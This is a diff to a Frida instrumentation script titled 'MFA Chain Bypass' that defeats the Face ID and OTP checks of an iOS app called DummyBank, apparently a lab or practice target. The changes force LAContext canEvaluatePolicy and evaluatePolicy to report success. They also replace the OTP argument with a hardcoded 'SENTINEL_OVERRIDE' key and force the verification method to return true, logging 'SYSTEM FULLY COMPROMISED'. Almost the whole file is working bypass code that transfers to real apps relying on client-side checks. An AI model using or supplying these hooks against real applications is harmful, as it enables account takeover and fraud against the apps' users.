@@ -1,26 +1,32 @@
 /**
  * Sentinel Hook - Phase 10.2 (MFA Chain Bypass)
- * Target: Chaining LAContext (FaceID) -> MFAAuthManager (OTP)
- * Execution: Automatically defeats the Biometric gate, then intercepts the OTP verification.
+ * FIXED: canEvaluatePolicy hook added, reply block called in onEnter,
+ *        OTP verifyOTP hook with forced true return.
  */
 
 if (ObjC.available) {
     console.log("[🌟] SENTINEL SUBSYSTEM: Initiating MFA Chain Override (Phase 10.2)");
     
-    // STEP 1: Biometric Engine Hook (Re-used from Phase 2.1)
+    // == STEP 1: Biometric Hook ==
     var LAContext = ObjC.classes.LAContext;
     try {
+        // Force canEvaluatePolicy → YES even on simulator
+        Interceptor.attach(LAContext["- canEvaluatePolicy:error:"].implementation, {
+            onLeave: function (retval) {
+                retval.replace(1);
+            }
+        });
+
+        // Fire success block immediately in onEnter before OS can reject
         Interceptor.attach(LAContext["- evaluatePolicy:localizedReason:reply:"].implementation, {
             onEnter: function (args) {
-                this.replyBlock = args[4];
-            },
-            onLeave: function (retval) {
-                if (!this.replyBlock.isNull()) {
-                    var block = new ObjC.Block(this.replyBlock);
-                    try {
-                        block.implementation(1, null);
-                        console.log("[+] CHAIN LINK 1 (Biometric): ACCESS GRANTED.");
-                    } catch (e) {}
+                console.log("[💥] CHAIN LINK 1 (Biometric): Intercepted. Forcing success...");
+                var replyBlock = new ObjC.Block(args[4]);
+                try {
+                    replyBlock.implementation(1, null);
+                    console.log("[+] CHAIN LINK 1 (Biometric): ACCESS GRANTED.");
+                } catch (e) {
+                    console.log("[-] Block exec error: " + e.message);
                 }
             }
         });
@@ -28,30 +34,30 @@ if (ObjC.available) {
         console.log("[-] ERROR: Chain Link 1 failed - " + err.message);
     }
     
-    // STEP 2: OTP / SMS Engine Hook
+    // == STEP 2: OTP Hook ==
     var targetMFA = "_TtC9DummyBank14MFAAuthManager";
     try {
         var AppMFAManager = ObjC.classes[targetMFA];
         if (AppMFAManager) {
-            console.log("[+] TARGET LOCKED: " + targetMFA + " mapped in memory. Waiting for OTP trigger...");
+            console.log("[+] TARGET LOCKED: " + targetMFA + " — waiting for OTP trigger...");
             
-            // Hook the generic verifyOTP method
             Interceptor.attach(AppMFAManager["- verifyOTPWithCode:"].implementation, {
                 onEnter: function(args) {
-                    console.log("\n[💥] SENTINEL MFA LINK: Intercepting OTP validation...");
-                    console.log("    -> Action: Injecting Sentinel God-Key ('SENTINEL_OVERRIDE')");
-                    
-                    // Replace the user's input with our hardcoded logic override
+                    console.log("[💥] CHAIN LINK 2 (OTP): Intercepting verification call...");
                     var godKey = ObjC.classes.NSString.stringWithString_("SENTINEL_OVERRIDE");
-                    args[2] = godKey; // args[0] = self, args[1] = selector, args[2] = code
+                    args[2] = godKey;
+                    console.log("    -> God-Key injected: SENTINEL_OVERRIDE");
                 },
                 onLeave: function(retval) {
-                    console.log("[✅] CHAIN LINK 2 (OTP): VALIDATION FORCED. SYSTEM FULLY COMPROMISED.");
+                    retval.replace(1); // Force return true
+                    console.log("[✅] CHAIN LINK 2 (OTP): FORCED. SYSTEM FULLY COMPROMISED.");
                 }
             });
+        } else {
+            console.log("[-] MFA class not found in memory yet. Ensure MFA Target E is open.");
         }
     } catch (err) {
-         console.log("[-] FATAL: Failed to hook MFA subsystem - " + err.message);
+        console.log("[-] ERROR: Chain Link 2 failed - " + err.message);
     }
 } else {
     console.log("[-] FATAL: Objective-C Runtime unavailable.");
